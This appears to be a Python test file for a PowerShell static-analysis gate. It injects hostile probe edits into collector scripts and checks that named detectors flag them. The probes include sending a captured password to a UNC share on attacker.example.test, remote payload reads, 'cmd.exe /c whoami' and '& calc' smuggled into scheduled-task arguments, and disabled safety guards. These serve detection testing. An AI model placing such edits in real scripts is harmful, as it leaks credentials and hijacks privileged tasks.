            "return '\"\\\\attacker.example.test\\share\\Mutate-Domain.ps1\"'",
        ),
    ),
    # DeepSeek round 4: the same helper class.
    (
        "r4d_helper_taskarg_append",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'\n",
            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\" & calc'\n",
        ),
    ),
    (
        "r4d_helper_abspath_change",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    return [IO.Path]::GetFullPath($Value)\n",
            "    return 'C:\\Windows\\Temp\\hijacked'\n",
        ),
    ),
    # Sol BL-3: the collection lock released before the protected block.
    (
        "r4s_early_lock_dispose",
        "Run-GpoLensCollection.ps1",
        "before",
        (
            "    $logArgs = @{LogPath=(Join-Path $OutputRoot 'collection.log');",
            "    $lock.Dispose()\n",
        ),
    ),
    # Sol NB-1: a write helper called outside its caller's guard.
    (
        "r4s_caller_guard_duplicate_marker_write",
        "Register-GpoLensCollection.ps1",
        "before",
        (
            "if ($MyInvocation.InvocationName -ne '.')",
            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot "
            "-Bytes ([Text.UTF8Encoding]::new($false).GetBytes($TaskName))\n",
        ),
    ),
    # Sol NB-3: a rejected Add-Type form must be a check failure, not a crash.
    (
        "r4s_add_type_path",
        "Export-GpoEstate.ps1",
        "append",
        "Add-Type -Path 'C:\\reviewer-evil.dll'\n",
    ),
    # Sol NB-2: CR bytes inside the existing here-string (old golden: SAME).
    (
        "r4s_here_string_crlf",
        "GpoLensCollectionMarker.ps1",
        "replace",
        ("namespace GpoLens {\n", "namespace GpoLens {\r\n"),
    ),
    # Cross-repo class 2: a ForEach-Object / Where-Object / .ForEach()
    # scriptblock runs in the caller's scope, so an unqualified assignment in it
    # rebinds the caller's pinned variable.
    (
        "r4x_foreach_object_scope_rebind",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-ChildItem -LiteralPath $OutputRoot | ForEach-Object { $OutputRoot = 'C:\\Windows' }\n",
    ),
    (
        "r4x_where_object_scope_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "Get-ChildItem -LiteralPath $OutputRoot | "
        "Where-Object { ($dest = 'C:\\Windows\\System32') }\n",
    ),
    (
        "r4x_intrinsic_foreach_scope_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "@(1).ForEach({ $OutputRoot = 'C:\\Windows' })\n",
    ),
    # Per-scope pinning: an existing pinned binding copied into another function.
    (
        "r4x_scope_moved_binding",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "    param([string]$Marker)\n",
            "    param([string]$Marker)\n"
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n",
        ),
    ),
    # Cross-repo class 1: re-cased command / method / parameter names.
    (
        "r4x_case_new_object_com",
        "Export-GpoEstate.ps1",
        "append",
        "nEw-ObJeCt -comobject 'WScript.Shell'\n",
    ),
    (
        "r4x_case_remove_item_duplicate",
        "Run-GpoLensCollection.ps1",
        "append",
        "remove-item -literalpath $folder -recurse -force\n",
    ),
    (
        "r4x_case_lifetime_dispose",
        "Run-GpoLensCollection.ps1",
        "before",
        (
            "    $logArgs = @{LogPath=(Join-Path $OutputRoot 'collection.log');",
            "    $LOCK.dispose()\n",
        ),
    ),
    # --- DeepSeek round 4 NEW-BLOCKING-1 (helper and guard bodies) ---
    (
        "r4d_helper_taskarg_hijack",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'\n",
            "    return '\"C:\\\\Windows\\\\System32\\\\cmd.exe\" /c whoami'\n",
        ),
    ),
    (
        "r4d_helper_early_return_getcompleted",
        "Run-GpoLensCollection.ps1",
        "before",
        (
            "    $candidates = @(Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' "
            "-ErrorAction Stop |",
            "    return (Get-Item -LiteralPath 'C:\\Windows\\Temp\\evil.zip')\n",
        ),
    ),
    (
        "r4d_guardbody_assert_regular_tree",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "        if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) {\n"
            "            throw 'Retention refuses a linked export folder or file.'\n"
            "        }\n"
            "        foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force)) {\n"
            "            if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) {\n"
            "                throw 'Retention refuses a linked export folder or file.'\n"
            "            }\n",
            "        foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force)) {\n",
        ),
    ),
    (
        "r4d_helper_owner_guard_neutered",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "    if (-not [string]::Equals($owner, $TaskName, "
            "[StringComparison]::OrdinalIgnoreCase)) {\n"
            '        throw "Collection refuses output root owner',
            '    if ($false) {\n        throw "Collection refuses output root owner',
        ),
    ),
    (
        "r4d_helper_entry_change",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "            if ($zip.GetEntry('AllGPOs.xml')) { $archive }",
            "            if ($zip.GetEntry('evil.xml')) { $archive }",
        ),
    ),
    (
        "r4d_helper_marker_linkcount_neutered",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "        if ($links -ne 1) { throw 'Collection refuses a linked owner marker.' }\n",
            "        if ($links -ne 1) { Write-Warning 'link count ignored' }\n",
        ),
    ),
    (
        "r4d_helper_filter_change",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' -ErrorAction Stop |",
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.*' -ErrorAction Stop |",
        ),
    ),
    (
        "r4d_guardbody_owner_guard_return",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "        throw 'Registration refuses a linked output root.'\n",
            "        Write-Warning 'skip linked output root'\n",
        ),
    ),
    # DeepSeek NON-BLOCKING-1: a static call on a computed type must be a clean
    # check failure (it crashed _write_targets at 64411db).
    (
        "r4d_static_computed_type",
        "Export-GpoEstate.ps1",
        "append",
        "$t = [IO.File]\n$t::Delete('C:\\Windows\\Temp\\x')\n",
    ),
    # DeepSeek NON-BLOCKING-3: a UTF-8 BOM (old golden: SAME; digest was of
    # BOM-stripped text).
    ("r4d_bom", "Export-GpoEstate.ps1", "prepend", "\ufeff"),
    # --- Round-5 candidates (Sol), each previously accepted ---
    # B1: an extra allowlisted output/read command exfiltrates the password.
    (
        "r5s_credential_console_exfil",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
            '        Write-Host "captured=$taskPassword"\n',
        ),
    ),
    (
        "r5s_credential_unc_exfil",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
            '        Get-Item -LiteralPath "\\\\attacker.example.test\\share\\$taskPassword" '
            "| Out-Null\n",
        ),
    ),
    (
        "r5s_arbitrary_unc_read",
        "Export-GroupMembers.ps1",
        "append",
        "Get-Content -LiteralPath '\\\\attacker.example.test\\share\\payload.txt' | Write-Host\n",
    ),
    # Same class: a copy of the secret to another variable (no new command).
    (
        "r5x_secret_copy",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
            "        $gateLeak = $taskPassword\n",
        ),
    ),
    # Non-blocking: ShouldProcess turned off in the script header.
    (
        "r5s_shouldprocess_false",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "[CmdletBinding(SupportsShouldProcess, DefaultParameterSetName = 'Gmsa')]",
            "[CmdletBinding(SupportsShouldProcess=$false, DefaultParameterSetName = 'Gmsa')]",
        ),
    ),
    # B2: the task-name validator removed again.
    (
        "r5s_taskname_validator_removed",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    [ValidatePattern('^[A-Za-z0-9][A-Za-z0-9 ._-]{0,199}$')]\n"
            "    [string]$TaskName = 'GpoLensCollection',",
            "    [string]$TaskName = 'GpoLensCollection',",
        ),
    ),
    # --- Round-6 candidates (Sol), each previously accepted ---
    # 1: a command-argument variable rebound to a remote path.
    (
        "r6s_remote_read_by_argument_rebind",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "    $metaPath = Join-Path $out 'gpo-metadata.json'\n",
            "    $metaPath = Join-Path $out 'gpo-metadata.json'\n"
            "    $metaPath = '\\\\attacker.example.test\\share\\payload.json'\n",
        ),
    ),
    # 2: guard-predicate variables rebound.
    (
        "r6s_force_unregister_by_guard_rebind",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    $ErrorActionPreference = 'Stop'\n",
            "    $ErrorActionPreference = 'Stop'\n    $Unregister = $true\n",
        ),
    ),
    (
        "r6s_force_real_run_by_guard_rebind",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "$ErrorActionPreference = 'Stop'\n",
            "$ErrorActionPreference = 'Stop'\n$DryRun = $false\n",
        ),
    ),
    (
        "r6s_silently_skip_sysvol_by_guard_rebind",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "$ErrorActionPreference = 'Stop'\n",
            "$ErrorActionPreference = 'Stop'\n$SkipSysvol = $true\n",
        ),
    ),
    # Same class: remote-looking literals bound to a variable anywhere.
    (
        "r6x_remote_literal_expandable",
        "Run-GpoLensCollection.ps1",
        "append",
        '$gateShare = "\\\\$env:COMPUTERNAME\\c$\\gate"\n',
    ),
    (
        "r6x_remote_literal_url",
        "Export-Principals.ps1",
        "append",
        "$gateUrl = 'https://attacker.example.test/payload'\n",
    ),
    # --- DeepSeek round 5 BL-1: 2-char prefix -Pi of -PipelineVariable ---
    (
        "r5d_pi_rebind_dest_copy",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "            Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
            "-ErrorAction Stop\n",
            "            Get-Item -LiteralPath 'C:\\Windows\\Temp' -Pi dest | "
            "Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
            "-ErrorAction Stop\n",
        ),
    ),
    (
        "r5d_pi_only_getitem",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath '/etc/hostname' -Pi knownIds | Out-Null\n",
    ),
    (
        "r5d_pi_rebind_receiver",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '/etc/hostname' -Pi stream | Out-Null\n",
    ),
    (
        "r5d_pi_rebind_out_before_write",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "$allGpos = Get-GPO -All\n",
            "Get-Item -LiteralPath '/etc/hostname' -Pi out | Out-Null\n$allGpos = Get-GPO -All\n",
        ),
    ),
    # Alias form of the same class.
    (
        "r5d_ov_alias_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath '/etc/hostname' -ov OutputRoot | Out-Null\n",
    ),
    # DeepSeek round-5 NB-3: a parameter that no real cmdlet parameter matches.
    (
        "r5d_unknown_parameter",
        "Export-GpoEstate.ps1",
        "append",
        "Get-ChildItem -LiteralPath 'C:\\x' -OutFile 'C:\\Windows\\Temp\\y'\n",
    ),
    # --- Round-7 candidates (Sol), each previously accepted ---
    # 1: an extra allowlisted read method with a computed UNC path.
    (
        "r7s_computed_unc_readallbytes",
        "Run-GpoLensCollection.ps1",
        "append",
        "[void][IO.File]::ReadAllBytes("
        "(-join ([char]92, [char]92, 'attacker.example.test\\share\\payload.bin')))\n",
    ),
    # 2: expression-only pipeline input injecting a remote SYSVOL copy source.
    (
        "r7s_pipeline_injected_sysvol_source",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "    Get-ChildItem -LiteralPath $src -File -ErrorAction SilentlyContinue |\n",
            "    (@([pscustomobject]@{ Name = 'payload.pol'; FullName = "
            "(-join ([char]92, [char]92, 'attacker.example.test\\share\\payload.pol')) }) + "
            "@(Get-ChildItem -LiteralPath $src -File -ErrorAction SilentlyContinue)) |\n",
        ),
    ),
    # 3: an extra allowlisted collection mutation suppressing a coverage gap.
    (
        "r7s_suppress_coverage_gap_with_add",
        "Export-GpoEstate.ps1",
        "append",
        # GUID assembled so tests/test_fixture_guid_lint.py sees no bare literal.
        "[void]$knownIds.Add('" + "-".join(("1" * 8, "1" * 4, "1" * 4, "1" * 4, "1" * 12)) + "')\n",
    ),
]

# NON-BL-3: the regression suite asserts WHICH substantive check flagged each
# probe, not merely that one did (so a parse error can never masquerade as a
# catch). Maps probe id -> the check name expected to raise.
_PROBE_EXPECTED_CHECK: dict[str, str] = {
    "sol_root_rebind": "pinned_bindings",
    "sol_registry_rebind": "pinned_bindings",
    "sol_set_itemtype": "writes",
    "sol_redirection": "redirections",
    "sol_redirection_stream": "redirections",
    "sol_get_gporeport_path": "writes",
    "sol_instance_delete": "dotnet",
    "sol_adsi_delete": "types",
    "sol_using_module": "usings",
    "sol_collector_rebind": "pinned_bindings",
    "sol_task_abuse": "task_action",
    "ds_writeroot_var": "pinned_bindings",
    "ds_writeroot_run": "pinned_bindings",
    "ds_adsi_copyto_marker": "types",
    "ds_register_args": "task_action",
    "ds_using_assembly": "usings",
    "neg_set_adobject": "commands",
    "neg_adsi_commit": "types",
    "neg_dynamic_member": "dotnet",
    "neg_com": "new_object_and_add_type",
    "neg_namespace_de": "usings",
    "neg_splat_write": "writes",
    "neg_addtype_inline": "new_object_and_add_type",
    "neg_import_module_unc": "commands",
    "r2_outvariable_rebind_root": "pinned_bindings",
    "r2_pipelinevariable_rebind_root": "pinned_bindings",
    "r2_errorvariable_rebind_root": "pinned_bindings",
    "r2_warningvariable_rebind_root": "pinned_bindings",
    "r2_informationvariable_rebind_root": "pinned_bindings",
    "r2_collectorpath_outvariable_override": "pinned_bindings",
    "r2_taskargs_outvariable_override": "pinned_bindings",
    "r2_parenthesized_receiver_delete": "instance_receivers",
    "r2_parenthesized_receiver_open_write": "instance_receivers",
    "r2_parenthesized_fileinfo_copyto_sysvol": "instance_receivers",
    "r2_wmi_remote_instance_delete": "types",
    "r2_taskname_direct_rebind": "pinned_bindings",
    "r2_task_unregister_wildcard": "task_action",
    "r2_task_register_remote_cimsession": "task_action",
    "r2_task_principal_runlevel_highest": "task_action",
    "r2_env_via_second_variable": "writes",
    "r2_dotdot_via_second_variable": "writes",
    "r2_computed_dotdot_via_second_variable": "writes",
    "r2_new_item_name_traversal": "writes",
    "ds_dotdot_child_var": "writes",
    "ds_interp_child": "writes",
    "ds_writealltext_child": "writes",
    "ds_copyitem_child": "writes",
    "ds_getgporeport_child": "writes",
    "ds_function_wrapped_write": "writes",
    "ds_script_scope_outputroot": "pinned_bindings",
    "ds_foreach_abs_root": "pinned_bindings",
    "ds_script_collectorpath": "pinned_bindings",
    "ds_script_windowsroot": "pinned_bindings",
    "ds_script_logpath": "pinned_bindings",
    "r3_receiver_rebind_delete": "pinned_bindings",
    "r3_unregister_duplicate": "guarded_ops",
    "r3_alias_provider": "bindings",
    "r3_requires_module": "ast",
    "r3_guard_or_to_and": "guarded_ops",
    "r3_reorder_guard_after_open": "guarded_ops",
    "r3_psdefault_register_cimsession": "bindings",
    "r3_psdefault_export": "bindings",
    "r3_psdefault_run": "bindings",
    "r3_reorder_retention_guard": "guarded_ops",
    "r3_outvariable_computed": "bindings",
    "r3_outvariable_indirect_var": "bindings",
    "r3_errorvariable_computed": "bindings",
    "r3_outvariable_braced": "bindings",
    "r3_member_later_argument": "guarded_ops",
    "r3_marker_open_mode": "guarded_ops",
    "r4_marker_root_rebind": "pinned_bindings",
    "r4_callsite_marker_root": "pinned_bindings",
    "r4_callsite_log_path": "pinned_bindings",
    "r4_multi_assignment_root": "bindings",
    "r4_drive_variable_write": "bindings",
    "r4_env_psmodulepath": "bindings",
    "r4_foreach_object_member": "commands",
    "r4_guard_function_redefined": "local_functions",
    "r4_safe_name_rebind": "pinned_bindings",
    "r4_ref_rebind_root": "pinned_bindings",
    "r4s_helper_returns_outside_file": "local_function_bodies",
    "r4s_task_quote_helper_remote_script": "local_function_bodies",
    "r4d_helper_taskarg_append": "local_function_bodies",
    "r4d_helper_abspath_change": "local_function_bodies",
    "r4s_early_lock_dispose": "guarded_ops",
    "r4s_caller_guard_duplicate_marker_write": "guarded_ops",
    "r4s_add_type_path": "new_object_and_add_type",
    "r4s_here_string_crlf": "ast",
    "r4x_foreach_object_scope_rebind": "pinned_bindings",
    "r4x_where_object_scope_rebind": "pinned_bindings",
    "r4x_intrinsic_foreach_scope_rebind": "pinned_bindings",
    "r4x_scope_moved_binding": "pinned_bindings",
    "r4x_case_new_object_com": "new_object_and_add_type",
    "r4x_case_remove_item_duplicate": "guarded_ops",
    "r4x_case_lifetime_dispose": "guarded_ops",
    "r4d_helper_taskarg_hijack": "local_function_bodies",
    "r4d_helper_early_return_getcompleted": "local_function_bodies",
    "r4d_guardbody_assert_regular_tree": "local_function_bodies",
    "r4d_helper_owner_guard_neutered": "local_function_bodies",
    "r4d_helper_entry_change": "local_function_bodies",
    "r4d_helper_marker_linkcount_neutered": "local_function_bodies",
    "r4d_helper_filter_change": "local_function_bodies",
    "r4d_guardbody_owner_guard_return": "local_function_bodies",
    "r4d_static_computed_type": "dotnet",
    "r4d_bom": "ast",
    "r5s_credential_console_exfil": "secret_uses",
    "r5s_credential_unc_exfil": "secret_uses",
    "r5s_arbitrary_unc_read": "remote_paths",
    "r5x_secret_copy": "secret_uses",
    "r5s_shouldprocess_false": "script_header",
    "r5s_taskname_validator_removed": "task_name_validator",
    "r6s_remote_read_by_argument_rebind": "pinned_bindings",
    "r6s_force_unregister_by_guard_rebind": "pinned_bindings",
    "r6s_force_real_run_by_guard_rebind": "pinned_bindings",
    "r6s_silently_skip_sysvol_by_guard_rebind": "pinned_bindings",
    "r6x_remote_literal_expandable": "remote_literals",
    "r6x_remote_literal_url": "remote_literals",
    "r5d_pi_rebind_dest_copy": "pinned_bindings",
    "r5d_pi_only_getitem": "pinned_bindings",
    "r5d_pi_rebind_receiver": "pinned_bindings",
    "r5d_pi_rebind_out_before_write": "pinned_bindings",
    "r5d_ov_alias_rebind": "pinned_bindings",
    "r5d_unknown_parameter": "commands",
    "r7s_computed_unc_readallbytes": "guarded_ops",
    "r7s_pipeline_injected_sysvol_source": "pipeline_inputs",
    "r7s_suppress_coverage_gap_with_add": "guarded_ops",
}


def _apply_edit(text: str, mode: str, edit: str | tuple[str, str]) -> str:
    if mode == "append":
        assert isinstance(edit, str)
        return text + "\n" + edit
    if mode == "prepend":
        assert isinstance(edit, str)
        return edit + text
    assert isinstance(edit, tuple)
    anchor, change = edit
    assert text.count(anchor) == 1, f"edit anchor must occur exactly once: {anchor!r}"
    if mode == "before":
        return text.replace(anchor, change + anchor, 1)
    assert mode == "replace", mode
    return text.replace(anchor, change, 1)


def _modified_inventory(
    exe: str,
    base: str,
    position: str,
    snippet: str | tuple[str, str],
    dest: Path,
    extra_files: dict[str, str] | None = None,
) -> dict[str, dict[str, Any]]:
    copy = dest / "scripts"
    copy.mkdir(parents=True, exist_ok=True)
    for name in POLICIES:
        text = (_SCRIPTS / name).read_text(encoding="utf-8")
        if name == base:
            text = _apply_edit(text, position, snippet)
        (copy / name).write_text(text, encoding="utf-8")
    for extra_name, extra_text in (extra_files or {}).items():
        (copy / extra_name).write_text(extra_text, encoding="utf-8")
    return _run_dumper(exe, [str(copy / name) for name in sorted(POLICIES)])


def test_every_probe_has_an_expected_check() -> None:
    ids = {p[0] for p in _REGRESSIONS}
    assert ids == set(_PROBE_EXPECTED_CHECK), (
        "every probe needs an expected check: "
        f"missing {sorted(ids - set(_PROBE_EXPECTED_CHECK))}, "
        f"stale {sorted(set(_PROBE_EXPECTED_CHECK) - ids)}"
    )


@pytest.mark.parametrize("probe", _REGRESSIONS, ids=[p[0] for p in _REGRESSIONS])
def test_reviewer_probes_are_flagged(tmp_path: Path, probe: Probe) -> None:
    probe_id, base, position, snippet = probe
    exe = _pwsh()
    extra = {"GateEvil.psm1": "'x' > './canary.txt'\n"} if "using_module" in probe_id else None
    inv = _modified_inventory(exe, base, position, snippet, tmp_path, extra)
    failed = _run_checks(base, inv)
    expected = _PROBE_EXPECTED_CHECK[probe_id]
    # The probe must be caught by its intended substantive check, not by a parse
    # error (NON-BL-3). The `using` probes deliberately fail parsing too, so
    # `parse` is tolerated only there.
    if "using" not in probe_id:
        assert "parse" not in failed, f"{probe_id}: flagged only by a parse error: {failed}"
    assert expected in failed, (
        f"{probe_id}: expected check {expected!r} did not flag it; raised {sorted(failed)}"
    )
    # Both layers: the edit also changes the committed syntax-tree inventory.
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    assert _canonical(inv[base]) != committed[base], (
        f"{probe_id}: the golden syntax-tree inventory did not change"
    )


# Edits the semantic layer deliberately admits (no write/exec/binding effect)
# but the golden inventory must still catch, so a reviewer sees them.
_GOLDEN_ONLY: list[Probe] = [
    # Sol round-3 collision_return: a trailing `return` (old inventory: SAME).
    ("r3_trailing_return", "Export-GpoEstate.ps1", "append", "return\n"),
    # A changed log/progress message (content, not a write target).
    (
        "r4_message_text",
        "Export-GpoEstate.ps1",
        "replace",
        ('Write-Host "DryRun: would export the following:"', 'Write-Host "DryRun: would export:"'),
    ),
    # Sol round-5 top_level_exit: a trailing `exit 0` (documented top-level limit).
    ("r5s_top_level_exit", "Export-GpoEstate.ps1", "append", "exit 0\n"),
    # Comment-only edit: AST identical, source digest differs.
    ("r4_comment_only", "Run-GpoLensCollection.ps1", "append", "# reviewer note\n"),
]


@pytest.mark.parametrize("probe", _GOLDEN_ONLY, ids=[p[0] for p in _GOLDEN_ONLY])
def test_golden_catches_semantically_neutral_edits(tmp_path: Path, probe: Probe) -> None:
    probe_id, base, position, snippet = probe
    inv = _modified_inventory(_pwsh(), base, position, snippet, tmp_path)
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    assert _canonical(inv[base]) != committed[base], f"{probe_id}: golden did not change"
    if probe_id == "r4_comment_only":
        assert _canonical(inv[base])["ast"] == committed[base]["ast"]
    else:
        assert _canonical(inv[base])["ast"] != committed[base]["ast"]


# ---------------------------------------------------------------------------
# Completeness of the syntax-tree serialization (meta-tests).
# ---------------------------------------------------------------------------

# Properties the serializer deliberately skips on every node type, and why.
_EXCLUDED_AST_PROPERTIES = {
    "*.Parent": "back-reference; structure is the row nesting",
    "*.Extent": "source position/text; the text is represented by the child nodes",
    "*.ErrorPosition": "source position of an operator token",
    "*.StaticType": "derived by the parser from the node type, constant or cast",
    "ConvertExpressionAst.Attribute": "the same object as ConvertExpressionAst.Type",
}
_KNOWN_REQUIREMENT_PROPERTIES = {
    "IsElevationRequired",
    "RequiredApplicationId",
    "RequiredAssemblies",
    "RequiredModules",
    "RequiredPSEditions",
    "RequiredPSVersion",
    "RequiresPSSnapIns",  # Windows PowerShell 5.1 only
}


def test_serializer_covers_every_ast_node_type() -> None:
    """Every concrete Ast type of the running PowerShell is in the serializer
    table, and every one of its public properties is serialized or excluded
    with a stated reason. A new PowerShell node type or property fails here.
    (A listed property this runtime lacks, e.g. ScriptBlockAst.CleanBlock before
    7.3, is skipped by the serializer, so it is not an error.)"""
    described = _run_dumper_raw(_pwsh(), [], "-Describe")
    table = described["table"]
    assert set(described["excluded"]) == set(_EXCLUDED_AST_PROPERTIES)
    problems: list[str] = []
    for node in described["ast_types"]:
        name = node["name"]
        if name not in table:
            problems.append(f"{name}: not in the serializer table")
            continue
        listed = set(table[name])
        for prop in node["properties"]:
            if prop in listed or f"*.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            if f"{name}.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            problems.append(f"{name}.{prop}: neither serialized nor excluded")
    assert not problems, "serializer table is incomplete:\n" + "\n".join(problems)
    unknown = set(described["script_requirements_properties"]) - _KNOWN_REQUIREMENT_PROPERTIES
    assert not unknown, f"new #Requires properties: {sorted(unknown)}"


# One construct per node type the collectors do not use, so the serializer is
# exercised on all of them (and the semantic layer's closed node set refuses
# them). Parsed only.
_EXOTIC_SOURCE = """#Requires -Version 5.1
using namespace System.Text
class GateBox : System.Object {
    [string] $Name = 'x'
    hidden static [int] $Count
    GateBox() { $this.Name = 'y' }
    [string] Show([int] $n) { return $this.Name * $n }
}
enum GateColor { Red = 1; Blue }
function Get-Gate { [CmdletBinding()] param([Parameter(Mandatory)][ValidateNotNull()] $a)
    dynamicparam { }
    begin { trap { continue } }
    process { do { $a-- } until ($a -lt 0); do { break } while ($false) }
    end { data GateData { 'x' }; $b = $a ? 1 : 2; Get-Item . && Get-Item .. || Get-Item / }
}
filter Test-Gate { $_ }
$x = [GateBox]::new(); $x.Show(2) | Out-Null
$s = { param($q) $using:q }
Start-Sleep 1 &
foreach -parallel ($i in 1..2) { $i }
switch -regex ('a') { 'a' { 1 } default { 2 } }
$h = @{ k = 1 }; $h['k'] += 2; [int]$h.k
"text $($h.k)" | Out-Null; @'
here
'@ | Out-Null
"""


def test_serializer_handles_every_node_type(tmp_path: Path) -> None:
    source = tmp_path / "exotic.ps1"
    source.write_bytes(_EXOTIC_SOURCE.encode("ascii"))
    entry = _run_dumper_raw(_pwsh(), [str(source)])[0]
    assert entry["unsupported_nodes"] == [], entry["unsupported_nodes"]
    lines = _canonical(entry)["ast"]
    assert lines[0].startswith("Script: ScriptBlockAst ScriptRequirements=")
    used = set(entry["node_types"])
    for kind in (
        "TypeDefinitionAst",
        "PropertyMemberAst",
        "FunctionMemberAst",
        "TrapStatementAst",
        "DataStatementAst",
        "TernaryExpressionAst",
        "PipelineChainAst",
        "UsingExpressionAst",
        "DoUntilStatementAst",
        "DoWhileStatementAst",
        "UsingStatementAst",
        "BaseCtorInvokeMemberExpressionAst",
    ):
        if kind == "BaseCtorInvokeMemberExpressionAst":
            continue  # only produced for `: base(...)`; covered by the table test
        assert kind in used, f"exotic source did not produce {kind}"
    # Every one of them is outside the closed node set.
    assert used - ALLOWED_NODE_TYPES


# Single-token mutations by token kind / operator text.
_OPERATOR_SWAPS = {
    "-eq": "-ne",
    "-ne": "-eq",
    "-or": "-and",
    "-and": "-or",
    "-band": "-bor",
    "-bor": "-band",
    "-gt": "-ge",
    "-ge": "-gt",
    "-lt": "-le",
    "-le": "-lt",
    "-match": "-notmatch",
    "-notmatch": "-match",
    "-like": "-notlike",
    "-notlike": "-like",
    "-contains": "-notcontains",
    "-notcontains": "-contains",
    "-in": "-notin",
    "-notin": "-in",
    "-is": "-isnot",
    "-isnot": "-is",
    "-not": "-bnot",
    "-replace": "-creplace",
    "-split": "-csplit",
    "-join": "-split",
    "-f": "-join",
    "+": "-",
    "-": "+",
    "*": "/",
    "/": "*",
    "=": "+=",
    "+=": "=",
    "++": "--",
    "--": "++",
    "2>": "3>",
    "*>&1": "*>&2",
    "break": "continue",
    "continue": "break",
}


def _token_mutation(token: dict[str, Any]) -> str | None:
    kind, text = token["kind"], token["text"]
    if kind in ("Variable", "SplattedVariable"):
        return text[:-1] + "Q}" if text.endswith("}") else text + "Q"
    if kind == "Parameter":
        return text[:-1] + "Q:" if text.endswith(":") else text + "Q"
    if kind == "Number":
        return "8" if text == "7" else "7"
    if kind in ("StringLiteral", "StringExpandable"):
        return text[0] + "Q" + text[1:]
    if kind in ("HereStringLiteral", "HereStringExpandable"):
        cut = text.index("\n") + 1
        return text[:cut] + "Q" + text[cut:]
    if kind in ("Identifier", "Generic"):
        return text + "Q"
    return _OPERATOR_SWAPS.get(text.casefold())


def _evenly(items: list[Any], count: int) -> list[Any]:
    if len(items) <= count:
        return list(items)
    step = (len(items) - 1) / (count - 1)
    return [items[round(i * step)] for i in range(count)]


def _mutants(source: str, sites: dict[str, Any]) -> list[tuple[str, str]]:
    """(label, mutated source) pairs that must each change the syntax tree."""
    out: list[tuple[str, str]] = []
    tokens = [t for t in sites["tokens"] if _token_mutation(t) is not None]
    for t in _evenly(tokens, 40):
        new = _token_mutation(t)
        assert new is not None
        out.append(
            (
                f"token {t['kind']} {t['text']!r}@{t['start']}",
                source[: t["start"]] + new + source[t["end"] :],
            )
        )
    swaps = []
    for s1, e1, s2, e2 in sites["siblings"]:
        if _norm(source[s1:e1]) != _norm(source[s2:e2]):
            swaps.append((s1, e1, s2, e2))
    for s1, e1, s2, e2 in _evenly(swaps, 15):
        swapped = source[:s1] + source[s2:e2] + source[e1:s2] + source[s1:e1] + source[e2:]
        out.append((f"swap statements @{s1}/{s2}", swapped))
    for start, end in _evenly(list(sites["conditions"]), 12):
        out.append(
            (
                f"negate condition @{start}",
                source[:start] + "-not (" + source[start:end] + ")" + source[end:],
            )
        )
    inserts = [*_evenly(list(sites["block_starts"]), 3), len(source)]
    for pos in inserts:
        for label, stmt in (
            ("index assignment", "$PSDefaultParameterValues['Get-Item:Force'] = $true\n"),
            ("return", "return\n"),
        ):
            sep = "" if pos == 0 or source[pos - 1] in "\n " else "\n"
            out.append((f"insert {label} @{pos}", source[:pos] + sep + stmt + source[pos:]))
    out.append(("#Requires module", "#Requires -Modules GpoLensProbe\n" + source))
    out.append(("#Requires elevation", "#Requires -RunAsAdministrator\n" + source))
    return out


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_inventory_detects_systematic_mutations(tmp_path: Path, script: str) -> None:
    """Generic completeness evidence: for each collector, mutate the source in
    systematic ways — change single tokens (evenly sampled over every mutable
    token: variables, parameters, numbers, strings, here-strings, identifiers,
    command names, operators, redirections, keywords), swap adjacent
    statements, negate conditions, insert an index assignment / `return`, add
    `#Requires` — and require the serialized syntax tree to differ for every
    mutant that still parses. Comment/whitespace-only edits must leave the tree
